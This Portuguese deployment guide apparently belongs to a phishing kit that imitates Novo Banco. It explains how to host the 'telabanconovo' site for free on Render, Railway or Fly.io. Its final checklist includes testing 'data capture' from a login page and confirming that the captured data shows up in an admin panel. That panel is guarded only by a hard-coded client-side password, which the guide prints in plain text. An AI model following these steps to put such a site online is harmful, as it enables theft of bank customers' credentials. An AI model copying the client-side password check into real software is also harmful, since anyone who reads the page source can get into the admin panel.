# 🚀 Guia de Deploy Gratuito - Sistema Novo Banco

Este guia mostra como hospedar seu sistema **permanentemente e de graça** em plataformas de hospedagem gratuitas.

---

## 📋 Opções de Hospedagem Gratuita

### ✅ **Opção 1: Render.com (RECOMENDADO)**
- ✨ 750 horas grátis por mês (suficiente para 24/7)
- 🚀 Deploy automático via GitHub
- 💾 Banco de dados SQLite funciona perfeitamente
- 🔄 SSL/HTTPS gratuito
- 📊 Fácil de usar

### ✅ **Opção 2: Railway.app**
- ✨ 500 horas grátis por mês
- 🚀 Deploy muito rápido
- 💾 Suporta SQLite
- 🔄 SSL/HTTPS gratuito

### ✅ **Opção 3: Fly.io**
- ✨ Plano gratuito disponível
- 🚀 Deploy via Docker
- 💾 Volumes persistentes para SQLite
- 🌍 Múltiplas regiões

---

## 🎯 MÉTODO 1: Deploy no Render.com (MAIS FÁCIL)

### Passo 1: Criar conta no GitHub
1. Acesse https://github.com
2. Crie uma conta gratuita (se ainda não tiver)

### Passo 2: Criar repositório no GitHub
1. Clique em "New repository"
2. Nome: `novobanco-sistema`
3. Deixe como **Privado** (importante para segurança)
4. Clique em "Create repository"

### Passo 3: Fazer upload do projeto
1. Descompacte o arquivo `novobanco-deploy.zip`
2. No terminal/cmd, navegue até a pasta do projeto:
   ```bash
   cd caminho/para/telabanconovo
   ```
3. Execute os comandos:
   ```bash
   git init
   git add .
   git commit -m "Initial commit"
   git branch -M main
   git remote add origin https://github.com/SEU-USUARIO/novobanco-sistema.git
   git push -u origin main
   ```

### Passo 4: Deploy no Render
1. Acesse https://render.com
2. Crie uma conta gratuita (pode usar conta do GitHub)
3. Clique em "New +" → "Web Service"
4. Conecte seu repositório GitHub
5. Selecione o repositório `novobanco-sistema`
6. Configurações:
   - **Name**: novobanco-sistema
   - **Region**: Oregon (US West)
   - **Branch**: main
   - **Build Command**: `pnpm install && pnpm build`
   - **Start Command**: `pnpm start`
   - **Instance Type**: Free
7. Clique em "Create Web Service"
8. Aguarde 5-10 minutos para o deploy completar

### Passo 5: Acessar seu site
Após o deploy, você receberá uma URL como:
`https://novobanco-sistema.onrender.com`

**Pronto! Seu site está online permanentemente e de graça!** 🎉

---

## 🎯 MÉTODO 2: Deploy no Railway.app

### Passo 1: Preparar GitHub
Siga os passos 1-3 do Método 1 acima.

### Passo 2: Deploy no Railway
1. Acesse https://railway.app
2. Crie uma conta gratuita
3. Clique em "New Project"
4. Selecione "Deploy from GitHub repo"
5. Escolha o repositório `novobanco-sistema`
6. Railway detectará automaticamente as configurações
7. Aguarde o deploy completar

### Passo 3: Configurar domínio
1. Vá em "Settings"
2. Em "Domains", clique em "Generate Domain"
3. Você receberá uma URL como: `https://novobanco-sistema.up.railway.app`

**Pronto! Sistema online 24/7 grátis!** 🎉

---

## 🎯 MÉTODO 3: Deploy no Fly.io

### Passo 1: Instalar Fly CLI
```bash
# Windows (PowerShell)
powershell -Command "iwr https://fly.io/install.ps1 -useb | iex"

# macOS/Linux
curl -L https://fly.io/install.sh | sh
```

### Passo 2: Login e Deploy
```bash
# Login
fly auth login

# Navegar até o projeto
cd caminho/para/telabanconovo

# Criar app
fly launch

# Configurações:
# - App name: novobanco-sistema
# - Region: escolha a mais próxima
# - PostgreSQL: No
# - Redis: No

# Deploy
fly deploy
```

### Passo 3: Criar volume para SQLite
```bash
fly volumes create data --size 1
```

**Sistema online permanentemente!** 🎉

---

## 📊 URLs do Sistema Após Deploy

Após o deploy, você terá:

- **Página Principal**: `https://seu-dominio.com/`
- **Login**: `https://seu-dominio.com/login.html`
- **Admin**: `https://seu-dominio.com/admin.html` (senha: 151612)

---

## 🔐 Segurança

### ⚠️ IMPORTANTE:
1. **Mantenha o repositório PRIVADO** no GitHub
2. **Não compartilhe a URL do admin** publicamente
3. **Altere a senha do admin** se necessário (edite o arquivo `admin-standalone.html`)

### Como alterar a senha do admin:
1. Abra o arquivo `admin-standalone.html`
2. Procure por: `if (password === '151612')`
3. Altere `151612` para sua nova senha
4. Faça commit e push para o GitHub
5. O Render/Railway fará redeploy automaticamente

---

## 💾 Backup dos Dados

Os dados ficam salvos no banco SQLite. Para fazer backup:

### No Render:
1. Vá em "Shell" no dashboard
2. Execute: `cat data.db > backup.db`
3. Baixe o arquivo via SFTP ou API

### No Railway:
1. Use o Railway CLI
2. Execute: `railway run cat data.db > backup.db`

---

## 🆘 Solução de Problemas

### Problema: Site não abre
**Solução**: Aguarde 5-10 minutos após o deploy. Planos gratuitos podem demorar para iniciar.

### Problema: Dados não são salvos
**Solução**: Certifique-se de que o volume/disco está configurado corretamente.

### Problema: Site fica offline
**Solução**: Planos gratuitos podem hibernar após inatividade. Acesse o site para reativá-lo.

---

## 📞 Suporte

Se tiver dúvidas:
- **Render**: https://render.com/docs
- **Railway**: https://docs.railway.app
- **Fly.io**: https://fly.io/docs

---

## ✅ Checklist Final

- [ ] Conta criada no GitHub
- [ ] Repositório criado (privado)
- [ ] Código enviado para GitHub
- [ ] Conta criada na plataforma de hospedagem
- [ ] Deploy realizado com sucesso
- [ ] Site acessível via URL pública
- [ ] Página de login funcionando
- [ ] Painel admin acessível (senha: 151612)
- [ ] Teste de captura de dados realizado
- [ ] Dados aparecem no painel admin

**Parabéns! Seu sistema está online permanentemente e de graça!** 🎉🚀
